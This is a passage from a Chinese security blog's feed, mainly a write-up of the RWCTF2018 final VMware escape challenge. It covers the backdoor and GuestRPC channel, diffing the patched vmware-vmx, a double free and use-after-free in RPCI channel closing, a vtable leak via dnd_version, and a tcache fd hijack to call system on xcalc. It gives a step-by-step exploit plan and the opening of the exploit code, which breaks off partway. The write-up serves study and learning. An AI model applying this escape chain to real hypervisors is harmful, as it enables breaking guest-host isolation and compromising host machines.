vmware才可以打开，不过这样打开的虚拟机，最后可以成功leak和执行，但是弹不出计算器，也就是命令执行失败，报错报了虚拟化错误，搞了好久没解决，最后也是莫名其妙的突然解决了。</p><p>两个vm类型的虚拟机逃逸收获很大，逆向的基础牢固了许多，realworld类的题目和CTF还是有很多差别，前者需要很好的逆向功底和对目标的熟悉，后者更多是技巧上的利用。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>realworld</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>虚拟机逃逸（一）</title>
    <link href="/2022/06/22/%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2022/06/22/%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<blockquote><p>本文首发于奇安信攻防社区 ： <a href="https://forum.butian.net/share/1666">https://forum.butian.net/share/1666</a></p></blockquote><h2 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h2><p>虚拟化技术逐渐的开源和云计算的需要，使得虚拟化迅速发展，从KVM，XEN到qemu，docker…等，。</p><p>服务和软件定义网络的理念模糊了开发和运维的界限，也把更多的安全问题带入到虚拟化技术中。更多基础设施即服务（Iaas）管理平台的问题以及云供应商的不可控都给虚拟化技术的安全应用带来阻碍，而真正的虚拟化安全要从虚拟化技术本身谈起。</p><p>早期的虚拟化提出的是，宿主机和虚拟机之间的隔离，但是随着技术的发展，两机之间的通信让这种隔离变得模糊化，无论是FTP还是共享机制，都给安全带来的较大的挑战，本文针对虚拟机逃逸漏洞进行一个入门级别的分析。</p><h2 id="0x02-如何逃逸"><a href="#0x02-如何逃逸" class="headerlink" title="0x02 如何逃逸"></a>0x02 如何逃逸</h2><p><strong>首先，需要明确提权的模型</strong>，虚拟机逃逸的情况繁多，大致的模型和提权方式都类似。（后续的一些示例表示，非内核态也可以逃逸）</p><ul><li>虚拟机操作系统发送敏感请求，使操作系统陷入内核态</li><li>某些特权指令会进入ring0以下的状态，即交给<code>Hypervisor</code>处理</li><li>利用Hypervisor的脆弱性漏洞使得Hypervisor执行完特权指令后不产生指令状态的返回，使得执行完指令后依然停留在内核态</li><li>实现了提权后，可以渗透到Hypervisor和虚拟机的其他区域，破坏虚拟化的隔离机制，完成逃逸操作。</li></ul><p><strong>了解基本的流程之后，就是理解</strong>。</p><p><img src="https://i.bmp.ovh/imgs/2022/06/11/55bab3ee7a10d74b.png" alt="img"><br> 以上是一个虚拟化的基本模型，这里使用的是一个全虚拟化的模型，VMM即hypervisor，提权利用的是特殊指令执行时候会陷入root mode。</p><p>这类指令的存在让提权和逃逸变得可行。总结以上流程，写出一个逃逸需要的基本条件。</p><ol><li>有漏洞的内核，即有可以执行使得陷入hypervisor的指令</li><li>有一次匹配的逃逸，理解为可以使得宿主机弹出一个计算器</li></ol><p>第二点的利用，在不同的虚拟化技术中，不一样，下面以VM ware的逃逸，做一个简单的例子。</p><h2 id="0x03-RWCTF2018-final-VMescape"><a href="#0x03-RWCTF2018-final-VMescape" class="headerlink" title="0x03 RWCTF2018 final VMescape"></a>0x03 RWCTF2018 final VMescape</h2><p>这题是RWCTF2018 final，做一个入手的题目非常的合适。</p><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>经常使用vmware虚拟机的人一定会熟悉其拖拽功能，即Guest和host之间的文件传递以及复制之类的操作，都是基于拖拽实现的，拖拽的背后是Guest和host之间的通信机制。而Vm类型的逃逸中，利用的就是该通信机制，这类机制被设计是现在了vmtools当中，高版本的vmware，vmtools消失，直接被自带安装。</p><h3 id="backdoor机制"><a href="#backdoor机制" class="headerlink" title="backdoor机制"></a>backdoor机制</h3><p>vmtools中有一个叫做backdoor的接口，该接口被用来实现通信。<a href="https://sites.google.com/site/chitchatvmback/backdoor">官方文档</a>,github中的开源文档也有<a href="https://github.com/vmware/open-vm-tools/blob/master/open-vm-tools/lib/backdoor/backdoorGcc64.c#L74-L104">open-vmtools</a>.</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span><span class="token function">Backdoor_InOut</span><span class="token punctuation">(</span>Backdoor_proto <span class="token operator">*</span>myBp<span class="token punctuation">)</span> <span class="token comment">// IN/OUT</span><span class="token punctuation">&#123;</span>   uint64 dummy<span class="token punctuation">;</span>   __asm__ <span class="token function">__volatile__</span><span class="token punctuation">(</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">__APPLE__</span></span>        <span class="token comment">/*         * Save %rbx on the stack because the Mac OS GCC doesn't want us to         * clobber it - it erroneously thinks %rbx is the PIC register.         * (Radar bug 7304232)         */</span>        <span class="token string">"pushq %%rbx"</span>           <span class="token string">"\n\t"</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>        <span class="token string">"pushq %%rax"</span>           <span class="token string">"\n\t"</span>        <span class="token string">"movq 40(%%rax), %%rdi"</span> <span class="token string">"\n\t"</span>        <span class="token string">"movq 32(%%rax), %%rsi"</span> <span class="token string">"\n\t"</span>        <span class="token string">"movq 24(%%rax), %%rdx"</span> <span class="token string">"\n\t"</span>        <span class="token string">"movq 16(%%rax), %%rcx"</span> <span class="token string">"\n\t"</span>        <span class="token string">"movq  8(%%rax), %%rbx"</span> <span class="token string">"\n\t"</span>        <span class="token string">"movq   (%%rax), %%rax"</span> <span class="token string">"\n\t"</span>        <span class="token string">"inl %%dx, %%eax"</span>       <span class="token string">"\n\t"</span>  <span class="token comment">/* NB: There is no inq instruction */</span>        <span class="token string">"xchgq %%rax, (%%rsp)"</span>  <span class="token string">"\n\t"</span>        <span class="token string">"movq %%rdi, 40(%%rax)"</span> <span class="token string">"\n\t"</span>        <span class="token string">"movq %%rsi, 32(%%rax)"</span> <span class="token string">"\n\t"</span>        <span class="token string">"movq %%rdx, 24(%%rax)"</span> <span class="token string">"\n\t"</span>        <span class="token string">"movq %%rcx, 16(%%rax)"</span> <span class="token string">"\n\t"</span>        <span class="token string">"movq %%rbx,  8(%%rax)"</span> <span class="token string">"\n\t"</span>        <span class="token string">"popq          (%%rax)"</span> <span class="token string">"\n\t"</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">__APPLE__</span></span>        <span class="token string">"popq %%rbx"</span>            <span class="token string">"\n\t"</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>其中有一条特权指令，<code>in</code>，这条指令在正常的操作系统执行会报错，但是在vm中的guest机器执行这条指令，这个异常会被 vmtools捕获，然后传递给<code>vmware-vmx.exe</code>进行通信操作。</p><p><strong>重点在于，backdoor普通用户也可以执行</strong>，所以，guest中，执行相应的代码，让操作系统陷入hypervisor层，然后再利用backdoor和host进行通信，触发此bug。</p><p>通信所需要的函数，再open-vmtools中也有实现。<code>Message_Send</code>和<code>Message_Recv</code>。<a href="https://github.com/vmware/open-vm-tools/blob/master/open-vm-tools/lib/message/message.c">git链接</a>。</p><p>在某一篇<a href="http://sysprogs.com/legacy/articles/kdvmware/guestrpc.shtml">文档</a>中，给出了该操作的基本使用.</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">unsigned</span> <span class="token function">__declspec</span><span class="token punctuation">(</span>naked<span class="token punctuation">)</span> <span class="token function">GetMousePos</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    __asm    <span class="token punctuation">&#123;</span>        mov eax<span class="token punctuation">,</span> <span class="token number">564</span>D5868h        mov ecx<span class="token punctuation">,</span> <span class="token number">4</span>        mov edx<span class="token punctuation">,</span> <span class="token number">5658</span>h        in eax<span class="token punctuation">,</span> dx        ret    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">unsigned</span> mousepos <span class="token operator">=</span> <span class="token function">GetMousePos</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span> <span class="token string">"鼠标光标位置：x=%d,y=%d\n"</span> <span class="token punctuation">,</span> mousepos <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">,</span> mousepos <span class="token operator">&amp;</span> <span class="token number">0xFFFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><blockquote><p>If this program is executed on a real machine, the in instruction  will cause a “privileged instruction” exception, as user-mode code runs  in Ring 3. However, when this program is executed on the virtual  machine, it will print the correct mouse cursor position.</p><p>在真机上会报错，而在虚拟机中，将获得鼠标位置。</p></blockquote><h3 id="GuestRPC-Drag-and-Drop-RPCI"><a href="#GuestRPC-Drag-and-Drop-RPCI" class="headerlink" title="GuestRPC | Drag and Drop RPCI"></a>GuestRPC | Drag and Drop RPCI</h3><p>这是在backdoor基础上实现的更为灵活的通信方式。单个 GuestRPC 调用由一系列请求组成：</p><ul><li>打开 GuestRPC 通道</li><li>发送命令长度</li><li>发送命令数据</li><li>接收回复大小</li><li>接收回复数据</li><li>发出接收结束信号</li><li>关闭频道</li></ul><p>具体的函数实现后面再去分析，这里实际上是实现了一套不那么底层的通信机制。依靠这个机制，guest和host之间可以实现许多有意思的操作，例如：dnd（Drag n Drop）、cp（Copy Paste）操作、发送或获取信息等。</p><p><img src="https://i.bmp.ovh/imgs/2022/06/11/3a60818ae9d00e21.png" alt="img"></p><p>再&#x2F;lib&#x2F;include&#x2F;rpcout.h中定义了相关的一些函数，这些函数用来构建和摧毁rpc通道。</p><p>最后的调用追踪如下。</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c">Rpcout_start<span class="token operator">-></span>Message_OpenAllocated<span class="token operator">-></span>Backdoor<span class="token punctuation">;</span>RpcOut_send<span class="token operator">-></span>Message_Send  <span class="token operator">&amp;</span> Message_Receive<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><p>这几处函数调用对backdoor的操作都是基于一个结构体。<code>Backdoor_proto</code></p><p>在<code>backdoor_types.h</code>中对其有定义。</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DECLARE_REG64_STRUCT</span> <span class="token punctuation">\</span>   <span class="token expression">DECLARE_REG32_STRUCT<span class="token punctuation">;</span> </span><span class="token punctuation">\</span>   <span class="token expression"><span class="token keyword">struct</span> <span class="token punctuation">&#123;</span> </span><span class="token punctuation">\</span>      <span class="token expression">uint32 low<span class="token punctuation">;</span> </span><span class="token punctuation">\</span>      <span class="token expression">uint32 high<span class="token punctuation">;</span> </span><span class="token punctuation">\</span>   <span class="token expression"><span class="token punctuation">&#125;</span> words<span class="token punctuation">;</span> </span><span class="token punctuation">\</span>   <span class="token expression">uint64 quad</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>实际上就是对相应的寄存器做一个设置。</p><p>除了以上的函数，vmx还提供了一种面向对象的方法实现以上功能，VMWareRPCChannel类，该类可以在内核和用户模式下使用。</p><blockquote><p>By using <a href="http://kdvmware.sysprogs.org/dox/a00032.html">VMWareRPCChannel</a> class it is possible to execute arbitrary GuestRPC requests, that  VMWare supports. However, the question of adding our own request types  is still open. Let’s examine the VMWARE-VMX.EXE internals. When a  GuestRPC is being issued by guest, code inside the VMWARE-VMX.EXE  searches the so-called GuestRPC handler table for a handler  corresponding the the issued request. A GuestRPC handler entry format  can be defined by the following structure:</p></blockquote><p>具体的实现这里不赘述，此外长亭的师傅也实现了一套Rpc的通信机制，在其知乎文章有分析。</p><p>通过这个RPCI可以直接向RPC，以往版本的漏洞分析中已经有该DnD漏洞的存在。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-8c778cb84b93e2c11fe15cbc508a537bd365b3e7.png" alt="图片.png"><br> memcpy没有size的判断，导致第二个包可以直接改totalsize为一个大值，这样导致了memcpy的溢出。发送Dnd的代码在dndCPTransportGuestRpc.hpp中，同样可以在open-vmtools里面找到源码。有人总结出了发送路径。</p><blockquote><p>rpcv3util::SendMsg-&gt;DnDCPTransportGuestRpc::SendPacket-&gt;RpcChannel_Send-&gt;Message_Send-&gt;backdoor</p></blockquote><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h4><p>题目给出了</p><p>rwctf.ovf、rwctf-disk1.vmdk、rwctf.mf、vmware-vmx-patched、VMware-Workstation-Full-15.0.2-10952284.x86_64.bundle和vmware-vmx</p><p>使用vof vmdk mf可以创建一个题目相同环境的虚拟机，patched即为题目环境的vmx，而bundle安装包中的是给出的vmware-vmx。</p><p>使用bindiff比较patched和原版的不同可以快速定位漏洞位置，bindiff官网在外网，可以在52破解下载。</p><p>使用ida的bindiff插件，然后把diff结果导入bindiff软件即可。</p><p>查看出来的不同有1处，</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-d11ec0897a90dd8c3ffacd41ebf25d705c91d72f.png" alt="图片.png"><br> 双击查看函数内容</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-7d058ac9547b0c5f1d39ba965dd9b771c627d9fb.png" alt="图片.png"></p><p>可以看到patched地方加入了大部分的nop指令，回到ida仔细分析该流程处nop掉的东西是什么。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-213799f6fc4e4063222b7f27d7ff3bf3d6a95b52.png" alt="图片.png"></p><p>仔细比较发现有一处and被修改，还有一处call之前的一个mov指令被nop掉了，F5回去查看被改掉的位置。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-b60e6ffb7fa00eee453237c55f8b52c31cdb4593.png" alt="图片.png"></p><p>少了一处被置为0的操作，还有一处and操作修改，查看整个函数，大部分都是<code>GuestMsg: Channel</code>之类的东西，以及上面的switch操作，此外报错都是一些协议错误以及格式之类的东西，猜测这里是RPC指令的处理函数。</p><p>然后我就一头扎进了open-vm的源码，，。。</p><p>看了非常久，大概得出一个结构体的模型</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-61000bff1bf24027f6e26da3bdf1ea5dfc805946.png" alt="图片.png"></p><p>其中大部分的操作还看不太懂，然后突然想起来查看GuestRPC 的操作流程。</p><ul><li>打开 GuestRPC 通道</li><li>发送命令长度</li><li>发送命令数据</li><li>接收回复大小</li><li>接收回复数据</li><li>发出接收结束信号</li><li>关闭频道</li></ul><p>发现可以和这里的switch对应起来，可以更加清除的理解其内容。</p><p>这里去掉了置0操作，没有将第一处buf置空，第二处把标志改为了21，这里可能是漏洞形成的重点。</p><p>根据正常流程，目标处调用的是这样一个函数。</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __fastcall <span class="token function">close_backdoor</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> __int16 a2<span class="token punctuation">,</span> <span class="token keyword">char</span> a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">void</span> <span class="token operator">*</span>v4<span class="token punctuation">;</span> <span class="token comment">// rdi</span>  v4 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>a3 <span class="token operator">&amp;</span> <span class="token number">0x20</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">free</span><span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>a3 <span class="token operator">&amp;</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">sub_176D90</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">sub_55A0E0</span><span class="token punctuation">(</span><span class="token string">"GuestRpc: Closing RPCI backdoor channel %u after send completion\n"</span><span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">sub_189FE0</span><span class="token punctuation">(</span>a2<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>这里有一个if分支是free掉a1+8位置的buf，要求是a3 and 0x20!&#x3D;0，这就刚好和patch的地方相符合，这里会导致一次free。</p><p>此处释放的缓冲区是偏移为8的地方的缓冲区，该缓冲区对应于内部用于存储传递回用户的回复数据的缓冲区。</p><p>同时在switch&#x3D;6的时候，此处会再次释放，这就导致了DF存在，而在这个DF的中间，重复使用该区域，可以利用为UAF。</p><p>下面就有了基本的思路</p><ul><li>leak</li><li>更改tcache的fd</li><li>获取<code>rip</code>控制<code>rdi</code>调用<code>system(&quot;/usr/bin/xcalc &amp;&quot;)</code></li></ul><p>在此guestrpc的区间内，对堆的操作非常少，所以该漏洞利用也是比较稳固的。</p><h4 id="attack"><a href="#attack" class="headerlink" title="attack"></a>attack</h4><p>leak操作利用的是比较老套的uaf利用</p><ul><li>分配三个通道 [A]、[B] 和 [C]</li><li>将命令发送<code>info-set</code>到通道 [A]</li><li>打开通道 [B] 并发出 a <code>info-get</code>以检索我们刚刚设置的数据</li><li>在通道 [B] 上发出回复长度和回复读取命令</li><li>在通道 [B] 上调用错误的 finalize 命令，释放底层的回复缓冲区</li><li>在通道 [C] 上调用<code>info-get</code>并接收回复长度，它在我们刚刚分配的同一地址分配一个缓冲区</li><li>关闭通道 [B]，再次释放缓冲区</li><li>阅读频道[C]上的回复以泄露我们的数据</li></ul><p>但是在channel C上形成的uaf，却并不能做到在tcache中泄露想要的glibc地址，所以在此基础上还需要往C中填入一些可以利用的地址。</p><p>这时候考虑到2017年的一个cve，通过dnd_version造成vtable的leak。</p><p>分析dnd_version如下。ida中搜索<code>vmx.capability.dnd_version</code>，找到对应的bind函数。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-a3f065bd71745da225b1c04c4a6d034e89f421c8.png" alt="图片.png"></p><p>其他的RPC命令类似，在发送“vmx.capability.dnd_version”命令的时候，对应的处理函数中如果发现当前版本和设置的版本不一致，就会调用函数创建新的 object，把原来的版本的object销毁。</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">sub_1116D0</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">,</span> __int64 a3<span class="token punctuation">,</span> <span class="token keyword">int</span> a4<span class="token punctuation">,</span> __int64 reply<span class="token punctuation">,</span> __int64 reply_len<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment">// er12</span>  __int64 v9<span class="token punctuation">;</span> <span class="token comment">// rax</span>  __int64 v10<span class="token punctuation">;</span> <span class="token comment">// rsi</span>  <span class="token keyword">int</span> v12<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-30h] BYREF</span>  <span class="token keyword">int</span> v13<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-2Ch] BYREF</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>a4 <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">set_reply</span><span class="token punctuation">(</span>reply<span class="token punctuation">,</span> reply_len<span class="token punctuation">,</span> <span class="token string">"1 argument expected"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v12 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token function">sub_5611D0</span><span class="token punctuation">(</span>v13<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v12<span class="token punctuation">,</span> a3<span class="token punctuation">,</span> <span class="token string">" "</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">set_reply</span><span class="token punctuation">(</span>reply<span class="token punctuation">,</span> reply_len<span class="token punctuation">,</span> <span class="token string">"Non-integer argument"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v8 <span class="token operator">=</span> v13<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v13<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">set_reply</span><span class="token punctuation">(</span>reply<span class="token punctuation">,</span> reply_len<span class="token punctuation">,</span> <span class="token string">"Invalid protocol version."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_171460</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>theCurrentVM <span class="token operator">+</span> <span class="token number">104LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v9 <span class="token operator">=</span> <span class="token function">sub_4723A0</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>theCurrentVM <span class="token operator">+</span> <span class="token number">104LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v8 <span class="token operator">==</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v9 <span class="token operator">+</span> <span class="token number">360</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    v10 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>    <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v9 <span class="token operator">+</span> <span class="token number">360</span><span class="token punctuation">)</span> <span class="token operator">=</span> v8<span class="token punctuation">;</span>    v10 <span class="token operator">=</span> <span class="token number">1LL</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">sub_472380</span><span class="token punctuation">(</span>v9<span class="token punctuation">,</span> v10<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_1711E0</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>theCurrentVM <span class="token operator">+</span> <span class="token number">104LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token function">sub_12FA20</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>v13<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">set_reply</span><span class="token punctuation">(</span>reply<span class="token punctuation">,</span> reply_len<span class="token punctuation">,</span> <span class="token string">"Failed to set VMDB"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v13<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">2</span> <span class="token punctuation">)</span>    <span class="token function">Tools_SetGuestDnDCapable</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">set_reply</span><span class="token punctuation">(</span>reply<span class="token punctuation">,</span> reply_len<span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>传入一个参数代表版本，如果不符合则销毁之前的结构体，创建一个新的结构体。更新在<code>vmx.capability.dnd_version</code>也有对应实现。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-bb838684db02dce7205e00d839ff208fed7e2264.png" alt="图片.png"></p><p>追踪函数</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-d6bea8ffd78640f22c86266f875cf6f17ba55736.png" alt="图片.png"></p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-028a1df016d78ca5454c36d7bdd28d0c504175cb.png" alt="图片.png"></p><p>那么可以猜到新的结构体大小总是为0xa8。可以通过该方法，控制buf的大小为0xa8，销毁原来的object获得新的object的时候，把channel B的UAF chunk申请出来，然后利用channel C leak libc基址。</p><p>有了leak，利用起来就简单了，直接改fd，然后劫持到bss段，改掉某一个函数指针为system即可。</p><p>新的leak方式如下</p><ul><li>开启channel A和channel B</li><li>A的输出缓冲区为bufA,A利用漏洞free bufA</li><li>然后B给guest发送out put，这时候控制B的buf大小和A一样，此时free的A再次被malloc出来</li><li>释放A，同时buf A被再次释放，此时调用<code>vmx.capability.dnd_version</code>，虚表在此时被写入bufB</li><li>leak出process base 然后根据偏移即可计算出system 以及一些函数指针的地址。</li></ul><p>最后以相同的方式，劫持fd即可,下面的exp是长亭师傅的，根据通信原理实现了一套通信机制，具体内容看参考，不赘述。</p><p>exp：</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span><span class="token keyword">void</span> <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span>cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>        <span class="token string">"movq %%rdi,%%r10\n\t"</span>        <span class="token string">"movq %%rsi,%%r11\n\t"</span>        <span class="token string">"movq %%rdx,%%r12\n\t"</span>        <span class="token 